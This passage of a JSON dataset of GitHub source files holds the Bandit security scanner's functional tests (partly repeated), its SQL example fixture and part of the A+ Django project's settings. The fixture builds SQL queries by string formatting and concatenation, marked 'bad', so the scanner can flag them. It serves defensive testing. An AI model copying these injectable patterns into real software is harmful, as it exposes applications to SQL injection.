4,\n            'issues': {'CONFIDENCE': {'HIGH': 2}, 'SEVERITY': {'LOW': 2}}\n        }\n        self.check_metrics('imports.py', expect)\n\n    def test_weak_cryptographic_key(self):\n        '''Test for weak key sizes.'''\n        expect = {\n            'SEVERITY': {'MEDIUM': 8, 'HIGH': 6},\n            'CONFIDENCE': {'HIGH': 14}\n        }\n        self.check_example('weak_cryptographic_key_sizes.py', expect)\n\n    def test_multiline_code(self):\n        '''Test issues in multiline statements return code as expected.'''\n        self.run_example('multiline_statement.py')\n        self.assertEqual(0, len(self.b_mgr.skipped))\n        self.assertEqual(1, len(self.b_mgr.files_list))\n        self.assertTrue(self.b_mgr.files_list[0].endswith(\n                        'multiline_statement.py'))\n\n        issues = self.b_mgr.get_issue_list()\n        self.assertEqual(2, len(issues))\n        self.assertTrue(\n            issues[0].fname.endswith('examples/multiline_statement.py')\n        )\n\n        self.assertEqual(1, issues[0].lineno)\n        self.assertEqual(list(range(1, 3)), issues[0].linerange)\n        self.assertIn('subprocess', issues[0].get_code())\n        self.assertEqual(5, issues[1].lineno)\n        self.assertEqual(list(range(3, 6 + 1)), issues[1].linerange)\n        self.assertIn('shell=True', issues[1].get_code())\n\n    def test_code_line_numbers(self):\n        self.run_example('binding.py')\n        issues = self.b_mgr.get_issue_list()\n\n        code_lines = issues[0].get_code().splitlines()\n        lineno = issues[0].lineno\n        self.assertEqual(\"%i \" % (lineno - 1), code_lines[0][:2])\n        self.assertEqual(\"%i \" % (lineno), code_lines[1][:2])\n        self.assertEqual(\"%i \" % (lineno + 1), code_lines[2][:2])\n\n    def test_flask_debug_true(self):\n        expect = {\n            'SEVERITY': {'HIGH': 1},\n            'CONFIDENCE': {'MEDIUM': 1}\n        }\n        self.check_example('flask_debug.py', expect)\n\n    def test_nosec(self):\n        expect = {\n            'SEVERITY': {},\n            'CONFIDENCE': {}\n        }\n        self.check_example('nosec.py', expect)\n\n    def test_baseline_filter(self):\n        issue_text = ('A Flask app appears to be run with debug=True, which '\n                      'exposes the Werkzeug debugger and allows the execution '\n                      'of arbitrary code.')\n        json = \"\"\"{\n          \"results\": [\n            {\n              \"code\": \"...\",\n              \"filename\": \"%s/examples/flask_debug.py\",\n              \"issue_confidence\": \"MEDIUM\",\n              \"issue_severity\": \"HIGH\",\n              \"issue_text\": \"%s\",\n              \"line_number\": 10,\n              \"line_range\": [\n                10\n              ],\n              \"test_name\": \"flask_debug_true\",\n              \"test_id\": \"B201\"\n            }\n          ]\n        }\n        \"\"\" % (os.getcwd(), issue_text)\n\n        self.b_mgr.populate_baseline(json)\n        self.run_example('flask_debug.py')\n        self.assertEqual(1, len(self.b_mgr.baseline))\n        self.assertEqual({}, self.b_mgr.get_issue_list())\n\n    def test_blacklist_input(self):\n        expect = {\n            'SEVERITY': {'HIGH': 1},\n            'CONFIDENCE': {'HIGH': 1}\n        }\n        self.check_example('input.py', expect)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/breddy31/bandit1/blob/2516e40d861df46e2412ce4f858343b6f4bf7a1c",
        "file_path": "/examples/sql_statements.py",
        "source": "import sqlalchemy\n\n# bad\nquery = \"SELECT * FROM foo WHERE id = '%s'\" % identifier\nquery = \"INSERT INTO foo VALUES ('a', 'b', '%s')\" % value\nquery = \"DELETE FROM foo WHERE id = '%s'\" % identifier\nquery = \"UPDATE foo SET value = 'b' WHERE id = '%s'\" % identifier\nquery = \"\"\"WITH cte AS (SELECT x FROM foo)\nSELECT x FROM cte WHERE x = '%s'\"\"\" % identifier\n\n# bad\ncur.execute(\"SELECT * FROM foo WHERE id = '%s'\" % identifier)\ncur.execute(\"INSERT INTO foo VALUES ('a', 'b', '%s')\" % value)\ncur.execute(\"DELETE FROM foo WHERE id = '%s'\" % identifier)\ncur.execute(\"UPDATE foo SET value = 'b' WHERE id = '%s'\" % identifier)\n\n# good\ncur.execute(\"SELECT * FROM foo WHERE id = '%s'\", identifier)\ncur.execute(\"INSERT INTO foo VALUES ('a', 'b', '%s')\", value)\ncur.execute(\"DELETE FROM foo WHERE id = '%s'\", identifier)\ncur.execute(\"UPDATE foo SET value = 'b' WHERE id = '%s'\", identifier)\n\n# bad\nquery = \"SELECT \" + val + \" FROM \" + val +\" WHERE id = \" + val\n\n# bad\ncur.execute(\"SELECT \" + val + \" FROM \" + val +\" WHERE id = \" + val)\n\n\n# bug: https://bugs.launchpad.net/bandit/+bug/1479625\ndef a():\n    def b():\n        pass\n    return b\n\na()(\"SELECT %s FROM foo\" % val)\n\n# real world false positives\nchoices=[('server_list', _(\"Select from active instances\"))]\nprint(\"delete from the cache as the first argument\")\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/breddy31/bandit1/blob/2516e40d861df46e2412ce4f858343b6f4bf7a1c",
        "file_path": "/tests/functional/test_functional.py",
        "source": "# -*- coding:utf-8 -*-\n#\n# Copyright 2014 Hewlett-Packard Development Company, L.P.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n# not use this file except in compliance with the License. You may obtain\n# a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n# License for the specific language governing permissions and limitations\n# under the License.\n\nimport os\n\nimport six\nimport testtools\n\nfrom bandit.core import config as b_config\nfrom bandit.core import constants as C\nfrom bandit.core import manager as b_manager\nfrom bandit.core import metrics\nfrom bandit.core import test_set as b_test_set\n\n\nclass FunctionalTests(testtools.TestCase):\n\n    '''Functional tests for bandit test plugins.\n\n    This set of tests runs bandit against each example file in turn\n    and records the score returned. This is compared to a known good value.\n    When new tests are added to an example the expected result should be\n    adjusted to match.\n    '''\n\n    def setUp(self):\n        super(FunctionalTests, self).setUp()\n        # NOTE(tkelsey): bandit is very sensitive to paths, so stitch\n        # them up here for the testing environment.\n        #\n        path = os.path.join(os.getcwd(), 'bandit', 'plugins')\n        b_conf = b_config.BanditConfig()\n        self.b_mgr = b_manager.BanditManager(b_conf, 'file')\n        self.b_mgr.b_conf._settings['plugins_dir'] = path\n        self.b_mgr.b_ts = b_test_set.BanditTestSet(config=b_conf)\n\n    def run_example(self, example_script, ignore_nosec=False):\n        '''A helper method to run the specified test\n\n        This method runs the test, which populates the self.b_mgr.scores\n        value. Call this directly if you need to run a test, but do not\n        need to test the resulting scores against specified values.\n        :param example_script: Filename of an example script to test\n        '''\n        path = os.path.join(os.getcwd(), 'examples', example_script)\n        self.b_mgr.ignore_nosec = ignore_nosec\n        self.b_mgr.discover_files([path], True)\n        self.b_mgr.run_tests()\n\n    def check_example(self, example_script, expect, ignore_nosec=False):\n        '''A helper method to test the scores for example scripts.\n\n        :param example_script: Filename of an example script to test\n        :param expect: dict with expected counts of issue types\n        '''\n        # reset scores for subsequent calls to check_example\n        self.b_mgr.scores = []\n        self.run_example(example_script, ignore_nosec=ignore_nosec)\n        expected = 0\n        result = 0\n        for test_scores in self.b_mgr.scores:\n            for score_type in test_scores:\n                self.assertIn(score_type, expect)\n                for rating in expect[score_type]:\n                    expected += (\n                        expect[score_type][rating] * C.RANKING_VALUES[rating]\n                    )\n                result += sum(test_scores[score_type])\n        self.assertEqual(expected, result)\n\n    def check_metrics(self, example_script, expect):\n        '''A helper method to test the metrics being returned.\n\n        :param example_script: Filename of an example script to test\n        :param expect: dict with expected values of metrics\n        '''\n        self.b_mgr.metrics = metrics.Metrics()\n        self.b_mgr.scores = []\n        self.run_example(example_script)\n\n        # test general metrics (excludes issue counts)\n        m = self.b_mgr.metrics.data\n        for k in expect:\n            if k != 'issues':\n                self.assertEqual(expect[k], m['_totals'][k])\n        # test issue counts\n        if 'issues' in expect:\n            for (criteria, default) in C.CRITERIA:\n                for rank in C.RANKING:\n                    label = '{0}.{1}'.format(criteria, rank)\n                    expected = 0\n                    if expect['issues'].get(criteria, None).get(rank, None):\n                        expected = expect['issues'][criteria][rank]\n                    self.assertEqual(expected, m['_totals'][label])\n\n    def test_binding(self):\n        '''Test the bind-to-0.0.0.0 example.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'MEDIUM': 1}}\n        self.check_example('binding.py', expect)\n\n    def test_crypto_md5(self):\n        '''Test the `hashlib.md5` example.'''\n        expect = {'SEVERITY': {'MEDIUM': 11},\n                  'CONFIDENCE': {'HIGH': 11}}\n        self.check_example('crypto-md5.py', expect)\n\n    def test_ciphers(self):\n        '''Test the `Crypto.Cipher` example.'''\n        expect = {'SEVERITY': {'HIGH': 13},\n                  'CONFIDENCE': {'HIGH': 13}}\n        self.check_example('ciphers.py', expect)\n\n    def test_cipher_modes(self):\n        '''Test for insecure cipher modes.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('cipher-modes.py', expect)\n\n    def test_eval(self):\n        '''Test the `eval` example.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('eval.py', expect)\n\n    def test_mark_safe(self):\n        '''Test the `mark_safe` example.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('mark_safe.py', expect)\n\n    def test_exec(self):\n        '''Test the `exec` example.'''\n        filename = 'exec-{}.py'\n        if six.PY2:\n            filename = filename.format('py2')\n            expect = {'SEVERITY': {'MEDIUM': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        else:\n            filename = filename.format('py3')\n            expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example(filename, expect)\n\n    def test_exec_as_root(self):\n        '''Test for the `run_as_root=True` keyword argument.'''\n        expect = {'SEVERITY': {'LOW': 5}, 'CONFIDENCE': {'MEDIUM': 5}}\n        self.check_example('exec-as-root.py', expect)\n\n    def test_hardcoded_passwords(self):\n        '''Test for hard-coded passwords.'''\n        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'MEDIUM': 7}}\n        self.check_example('hardcoded-passwords.py', expect)\n\n    def test_hardcoded_tmp(self):\n        '''Test for hard-coded /tmp, /var/tmp, /dev/shm.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'MEDIUM': 3}}\n        self.check_example('hardcoded-tmp.py', expect)\n\n    def test_httplib_https(self):\n        '''Test for `httplib.HTTPSConnection`.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('httplib_https.py', expect)\n\n    def test_imports_aliases(self):\n        '''Test the `import X as Y` syntax.'''\n        expect = {\n            'SEVERITY': {'LOW': 4, 'MEDIUM': 5, 'HIGH': 0},\n            'CONFIDENCE': {'HIGH': 9}\n        }\n        self.check_example('imports-aliases.py', expect)\n\n    def test_imports_from(self):\n        '''Test the `from X import Y` syntax.'''\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('imports-from.py', expect)\n\n    def test_imports_function(self):\n        '''Test the `__import__` function.'''\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('imports-function.py', expect)\n\n    def test_telnet_usage(self):\n        '''Test for `import telnetlib` and Telnet.* calls.'''\n        expect = {'SEVERITY': {'HIGH': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('telnetlib.py', expect)\n\n    def test_ftp_usage(self):\n        '''Test for `import ftplib` and FTP.* calls.'''\n        expect = {'SEVERITY': {'HIGH': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('ftplib.py', expect)\n\n    def test_imports(self):\n        '''Test for dangerous imports.'''\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('imports.py', expect)\n\n    def test_mktemp(self):\n        '''Test for `tempfile.mktemp`.'''\n        expect = {'SEVERITY': {'MEDIUM': 4}, 'CONFIDENCE': {'HIGH': 4}}\n        self.check_example('mktemp.py', expect)\n\n    def test_nonsense(self):\n        '''Test that a syntactically invalid module is skipped.'''\n        self.run_example('nonsense.py')\n        self.assertEqual(1, len(self.b_mgr.skipped))\n\n    def test_okay(self):\n        '''Test a vulnerability-free file.'''\n        expect = {'SEVERITY': {}, 'CONFIDENCE': {}}\n        self.check_example('okay.py', expect)\n\n    def test_os_chmod(self):\n        '''Test setting file permissions.'''\n        filename = 'os-chmod-{}.py'\n        if six.PY2:\n            filename = filename.format('py2')\n        else:\n            filename = filename.format('py3')\n        expect = {\n            'SEVERITY': {'MEDIUM': 2, 'HIGH': 8},\n            'CONFIDENCE': {'MEDIUM': 1, 'HIGH': 9}\n        }\n        self.check_example(filename, expect)\n\n    def test_os_exec(self):\n        '''Test for `os.exec*`.'''\n        expect = {'SEVERITY': {'LOW': 8}, 'CONFIDENCE': {'MEDIUM': 8}}\n        self.check_example('os-exec.py', expect)\n\n    def test_os_popen(self):\n        '''Test for `os.popen`.'''\n        expect = {'SEVERITY': {'LOW': 8, 'MEDIUM': 0, 'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 9}}\n        self.check_example('os-popen.py', expect)\n\n    def test_os_spawn(self):\n        '''Test for `os.spawn*`.'''\n        expect = {'SEVERITY': {'LOW': 8}, 'CONFIDENCE': {'MEDIUM': 8}}\n        self.check_example('os-spawn.py', expect)\n\n    def test_os_startfile(self):\n        '''Test for `os.startfile`.'''\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'MEDIUM': 3}}\n        self.check_example('os-startfile.py', expect)\n\n    def test_os_system(self):\n        '''Test for `os.system`.'''\n        expect = {'SEVERITY': {'LOW': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('os_system.py', expect)\n\n    def test_pickle(self):\n        '''Test for the `pickle` module.'''\n        expect = {\n            'SEVERITY': {'LOW': 2, 'MEDIUM': 6},\n            'CONFIDENCE': {'HIGH': 8}\n        }\n        self.check_example('pickle_deserialize.py', expect)\n\n    def test_popen_wrappers(self):\n        '''Test the `popen2` and `commands` modules.'''\n        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'HIGH': 7}}\n        self.check_example('popen_wrappers.py', expect)\n\n    def test_random_module(self):\n        '''Test for the `random` module.'''\n        expect = {'SEVERITY': {'LOW': 6}, 'CONFIDENCE': {'HIGH': 6}}\n        self.check_example('random_module.py', expect)\n\n    def test_requests_ssl_verify_disabled(self):\n        '''Test for the `requests` library skipping verification.'''\n        expect = {'SEVERITY': {'HIGH': 7}, 'CONFIDENCE': {'HIGH': 7}}\n        self.check_example('requests-ssl-verify-disabled.py', expect)\n\n    def test_skip(self):\n        '''Test `#nosec` and `#noqa` comments.'''\n        expect = {'SEVERITY': {'LOW': 5}, 'CONFIDENCE': {'HIGH': 5}}\n        self.check_example('skip.py', expect)\n\n    def test_ignore_skip(self):\n        '''Test --ignore-nosec flag.'''\n        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'HIGH': 7}}\n        self.check_example('skip.py', expect, ignore_nosec=True)\n\n    def test_sql_statements(self):\n        '''Test for SQL injection through string building.'''\n        expect = {\n            'SEVERITY': {'MEDIUM': 12},\n            'CONFIDENCE': {'LOW': 7, 'MEDIUM': 5}}\n        self.check_example('sql_statements.py', expect)\n\n    def test_ssl_insecure_version(self):\n        '''Test for insecure SSL protocol versions.'''\n        expect = {\n            'SEVERITY': {'LOW': 1, 'MEDIUM': 10, 'HIGH': 7},\n            'CONFIDENCE': {'LOW': 0, 'MEDIUM': 11, 'HIGH': 7}\n        }\n        self.check_example('ssl-insecure-version.py', expect)\n\n    def test_subprocess_shell(self):\n        '''Test for `subprocess.Popen` with `shell=True`.'''\n        expect = {\n            'SEVERITY': {'HIGH': 3, 'MEDIUM': 1, 'LOW': 14},\n            'CONFIDENCE': {'HIGH': 17, 'LOW': 1}\n        }\n        self.check_example('subprocess_shell.py', expect)\n\n    def test_urlopen(self):\n        '''Test for dangerous URL opening.'''\n        expect = {'SEVERITY': {'MEDIUM': 14}, 'CONFIDENCE': {'HIGH': 14}}\n        self.check_example('urlopen.py', expect)\n\n    def test_utils_shell(self):\n        '''Test for `utils.execute*` with `shell=True`.'''\n        expect = {\n            'SEVERITY': {'LOW': 5},\n            'CONFIDENCE': {'HIGH': 5}\n        }\n        self.check_example('utils-shell.py', expect)\n\n    def test_wildcard_injection(self):\n        '''Test for wildcard injection in shell commands.'''\n        expect = {\n            'SEVERITY': {'HIGH': 4, 'MEDIUM': 0, 'LOW': 10},\n            'CONFIDENCE': {'MEDIUM': 5, 'HIGH': 9}\n        }\n        self.check_example('wildcard-injection.py', expect)\n\n    def test_yaml(self):\n        '''Test for `yaml.load`.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('yaml_load.py', expect)\n\n    def test_jinja2_templating(self):\n        '''Test jinja templating for potential XSS bugs.'''\n        expect = {\n            'SEVERITY': {'HIGH': 4},\n            'CONFIDENCE': {'HIGH': 3, 'MEDIUM': 1}\n        }\n        self.check_example('jinja2_templating.py', expect)\n\n    def test_secret_config_option(self):\n        '''Test for `secret=True` in Oslo's config.'''\n        expect = {\n            'SEVERITY': {'LOW': 1, 'MEDIUM': 2},\n            'CONFIDENCE': {'MEDIUM': 3}\n        }\n        self.check_example('secret-config-option.py', expect)\n\n    def test_mako_templating(self):\n        '''Test Mako templates for XSS.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('mako_templating.py', expect)\n\n    def test_xml(self):\n        '''Test xml vulnerabilities.'''\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 4},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 4}}\n        self.check_example('xml_etree_celementtree.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 2},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 2}}\n        self.check_example('xml_expatbuilder.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 3, 'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 3, 'MEDIUM': 1}}\n        self.check_example('xml_lxml.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 2},\n                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 2}}\n        self.check_example('xml_pulldom.py', expect)\n\n        expect = {'SEVERITY': {'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('xml_xmlrpc.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 4},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 4}}\n        self.check_example('xml_etree_elementtree.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 1}}\n        self.check_example('xml_expatreader.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 2},\n                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 2}}\n        self.check_example('xml_minidom.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 6},\n                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 6}}\n        self.check_example('xml_sax.py', expect)\n\n    def test_httpoxy(self):\n        '''Test httpoxy vulnerability.'''\n        expect = {'SEVERITY': {'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('httpoxy_cgihandler.py', expect)\n        self.check_example('httpoxy_twisted_script.py', expect)\n        self.check_example('httpoxy_twisted_directory.py', expect)\n\n    def test_asserts(self):\n        '''Test catching the use of assert.'''\n        expect = {'SEVERITY': {'LOW': 1},\n                  'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('assert.py', expect)\n\n    def test_paramiko_injection(self):\n        '''Test paramiko command execution.'''\n        expect = {'SEVERITY': {'MEDIUM': 2},\n                  'CONFIDENCE': {'MEDIUM': 2}}\n        self.check_example('paramiko_injection.py', expect)\n\n    def test_partial_path(self):\n        '''Test process spawning with partial file paths.'''\n        expect = {'SEVERITY': {'LOW': 11},\n                  'CONFIDENCE': {'HIGH': 11}}\n\n        self.check_example('partial_path_process.py', expect)\n\n    def test_try_except_continue(self):\n        '''Test try, except, continue detection.'''\n        test = next((x for x in self.b_mgr.b_ts.tests['ExceptHandler']\n                    if x.__name__ == 'try_except_continue'))\n\n        test._config = {'check_typed_exception': True}\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('try_except_continue.py', expect)\n\n        test._config = {'check_typed_exception': False}\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('try_except_continue.py', expect)\n\n    def test_try_except_pass(self):\n        '''Test try, except pass detection.'''\n        test = next((x for x in self.b_mgr.b_ts.tests['ExceptHandler']\n                     if x.__name__ == 'try_except_pass'))\n\n        test._config = {'check_typed_exception': True}\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('try_except_pass.py', expect)\n\n        test._config = {'check_typed_exception': False}\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('try_except_pass.py', expect)\n\n    def test_metric_gathering(self):\n        expect = {\n            'nosec': 2, 'loc': 7,\n            'issues': {'CONFIDENCE': {'HIGH': 5}, 'SEVERITY': {'LOW': 5}}\n        }\n        self.check_metrics('skip.py', expect)\n        expect = {\n            'nosec': 0, 'loc': 4,\n            'issues': {'CONFIDENCE': {'HIGH': 2}, 'SEVERITY': {'LOW': 2}}\n        }\n        self.check_metrics('imports.py', expect)\n\n    def test_weak_cryptographic_key(self):\n        '''Test for weak key sizes.'''\n        expect = {\n            'SEVERITY': {'MEDIUM': 8, 'HIGH': 6},\n            'CONFIDENCE': {'HIGH': 14}\n        }\n        self.check_example('weak_cryptographic_key_sizes.py', expect)\n\n    def test_multiline_code(self):\n        '''Test issues in multiline statements return code as expected.'''\n        self.run_example('multiline_statement.py')\n        self.assertEqual(0, len(self.b_mgr.skipped))\n        self.assertEqual(1, len(self.b_mgr.files_list))\n        self.assertTrue(self.b_mgr.files_list[0].endswith(\n                        'multiline_statement.py'))\n\n        issues = self.b_mgr.get_issue_list()\n        self.assertEqual(2, len(issues))\n        self.assertTrue(\n            issues[0].fname.endswith('examples/multiline_statement.py')\n        )\n\n        self.assertEqual(1, issues[0].lineno)\n        self.assertEqual(list(range(1, 3)), issues[0].linerange)\n        self.assertIn('subprocess', issues[0].get_code())\n        self.assertEqual(5, issues[1].lineno)\n        self.assertEqual(list(range(3, 6 + 1)), issues[1].linerange)\n        self.assertIn('shell=True', issues[1].get_code())\n\n    def test_code_line_numbers(self):\n        self.run_example('binding.py')\n        issues = self.b_mgr.get_issue_list()\n\n        code_lines = issues[0].get_code().splitlines()\n        lineno = issues[0].lineno\n        self.assertEqual(\"%i \" % (lineno - 1), code_lines[0][:2])\n        self.assertEqual(\"%i \" % (lineno), code_lines[1][:2])\n        self.assertEqual(\"%i \" % (lineno + 1), code_lines[2][:2])\n\n    def test_flask_debug_true(self):\n        expect = {\n            'SEVERITY': {'HIGH': 1},\n            'CONFIDENCE': {'MEDIUM': 1}\n        }\n        self.check_example('flask_debug.py', expect)\n\n    def test_nosec(self):\n        expect = {\n            'SEVERITY': {},\n            'CONFIDENCE': {}\n        }\n        self.check_example('nosec.py', expect)\n\n    def test_baseline_filter(self):\n        issue_text = ('A Flask app appears to be run with debug=True, which '\n                      'exposes the Werkzeug debugger and allows the execution '\n                      'of arbitrary code.')\n        json = \"\"\"{\n          \"results\": [\n            {\n              \"code\": \"...\",\n              \"filename\": \"%s/examples/flask_debug.py\",\n              \"issue_confidence\": \"MEDIUM\",\n              \"issue_severity\": \"HIGH\",\n              \"issue_text\": \"%s\",\n              \"line_number\": 10,\n              \"line_range\": [\n                10\n              ],\n              \"test_name\": \"flask_debug_true\",\n              \"test_id\": \"B201\"\n            }\n          ]\n        }\n        \"\"\" % (os.getcwd(), issue_text)\n\n        self.b_mgr.populate_baseline(json)\n        self.run_example('flask_debug.py')\n        self.assertEqual(1, len(self.b_mgr.baseline))\n        self.assertEqual({}, self.b_mgr.get_issue_list())\n\n    def test_blacklist_input(self):\n        expect = {\n            'SEVERITY': {'HIGH': 1},\n            'CONFIDENCE': {'HIGH': 1}\n        }\n        self.check_example('input.py', expect)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/aplus/api/__init__.py",
        "source": "from django.core.urlresolvers import reverse\nfrom rest_framework.settings import api_settings\n\ndef api_reverse(name, kwargs=None, **extra):\n    if not kwargs:\n        kwargs = {}\n    kwargs.setdefault('version', api_settings.DEFAULT_VERSION)\n    return reverse('api:' + name, kwargs=kwargs, **extra)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/aplus/settings.py",
        "source": "####\n# Default settings for A+ Django project.\n# You should create local_settings.py to override any settings.\n# You can copy local_settings.example.py and start from there.\n##\nfrom os.path import abspath, dirname, join\nfrom django.utils.translation import ugettext_lazy as _\nBASE_DIR = dirname(dirname(abspath(__file__)))\n\n\n# Base options, commonly overridden in local_settings.py\n##########################################################################\nDEBUG = False\nSECRET_KEY = None\nADMINS = (\n    # ('Your Name', 'your_email@domain.com'),\n)\n#SERVER_EMAIL = 'root@'\nEMAIL_TIMEOUT = 30 # Do not block web workers when email backend is broken\nALLOWED_HOSTS = [\"*\"]\n##########################################################################\n\n\n# Content (may override in local_settings.py)\n#\n# Any templates can be overridden by copying into\n# local_templates/possible_path/template_name.html\n##########################################################################\nSITEWIDE_ALERT_TEXT = None\nBRAND_NAME = 'A+'\n\nWELCOME_TEXT = 'Welcome to A+ <small>modern learning environment</small>'\nSHIBBOLETH_TITLE_TEXT = 'Aalto University users'\nSHIBBOLETH_BODY_TEXT = 'Log in with Aalto University user account by clicking the button below. Programme students and faculty must login here.'\nSHIBBOLETH_BUTTON_TEXT = 'Aalto Login'\nMOOC_TITLE_TEXT = 'Users external to Aalto'\nMOOC_BODY_TEXT = 'Some of our courses are open for everyone. Login with your user account from one of the following services.'\nLOGIN_TITLE_TEXT = ''\nLOGIN_BODY_TEXT = ''\nLOGIN_BUTTON_TEXT = 'Maintenance login'\nINTERNAL_USER_LABEL = 'Aalto'\nEXTERNAL_USER_LABEL = 'MOOC'\n\nWELCOME_TEXT_FI = 'A+ <small>verkkopohjainen oppimisymprist</small>'\nSHIBBOLETH_TITLE_TEXT_FI = 'Aalto-yliopiston kyttjt'\nSHIBBOLETH_BODY_TEXT_FI = 'Kirjaudu palveluun Aalto-yliopiston kyttjtunnuksella alla olevasta painikkeesta. Koulutusohjelmien opiskelijoiden ja henkilkunnan pit kirjautua tst.'\nSHIBBOLETH_BUTTON_TEXT_FI = 'Aalto-kirjautuminen'\nMOOC_TITLE_TEXT_FI = 'Kyttjt Aallon ulkopuolelta'\nMOOC_BODY_TEXT_FI = 'Osa kursseistamme on avoinna kaikille. Kirjaudu sisn jonkin seuraavan palvelun kyttjtunnuksellasi.'\nLOGIN_TITLE_TEXT_FI = ''\nLOGIN_BODY_TEXT_FI = ''\nLOGIN_BUTTON_TEXT_FI = 'Yllpidon kirjautuminen'\n\nTRACKING_HTML = ''\n\nEXCEL_CSV_DEFAULT_DELIMITER = ';'\n##########################################################################\n\n# Exercise loading settings\nEXERCISE_HTTP_TIMEOUT = 15\nEXERCISE_HTTP_RETRIES = (5,5,5)\nEXERCISE_ERROR_SUBJECT = \"\"\"A+ exercise error in {course}: {exercise}\"\"\"\nEXERCISE_ERROR_DESCRIPTION = \"\"\"\nAs a course teacher or technical contact you were automatically emailed by A+ about the error incident. A student could not access or submit an exercise because the grading service used is offline or unable to produce valid response.\n\n{message}\n\nOpen the exercise:\n  {exercise_url}\nEdit course email settings:\n  {course_edit_url}\n\n****************************************\nError trace:\n****************************************\n\n{error_trace}\n\n****************************************\nRequest fields:\n****************************************\n\n{request_fields}\n\"\"\"\n\nINSTALLED_APPS = (\n    'django.contrib.contenttypes',\n    'django.contrib.staticfiles',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.humanize',\n\n    # 3rd party applications\n    'bootstrapform',\n    'rest_framework',\n    'rest_framework.authtoken',\n\n    # First party applications\n    'inheritance',\n    'userprofile',\n    'authorization',\n    'course',\n    'exercise',\n    'edit_course',\n    'deviations',\n    'notification',\n    'external_services',\n    'news',\n    'threshold',\n    'diploma',\n    'apps',\n    'redirect_old_urls',\n\n    'js_jquery_toggle',\n    'django_colortag',\n)\n\n# Different login options (may override in local_settings.py)\n##########################################################################\n\n## Shibboleth\n\n#INSTALLED_APPS += ('shibboleth_login',)\n\n# Apache module mod_uwsgi was unable to create UTF-8 environment variables.\n# Problem was avoided by URL encoding in Shibboleth:\n# <RequestMapper type=\"Native\">\n#   <RequestMap applicationId=\"default\" encoding=\"URL\" />\n# </RequestMapper>\nSHIBBOLETH_VARIABLES_URL_ENCODED = True\n\n# Fields to receive from the Shibboleth (defaults).\n#SHIB_USER_ID_KEY = 'SHIB_eppn'\n#SHIB_FIRST_NAME_KEY = 'SHIB_displayName'\n#SHIB_LAST_NAME_KEY = 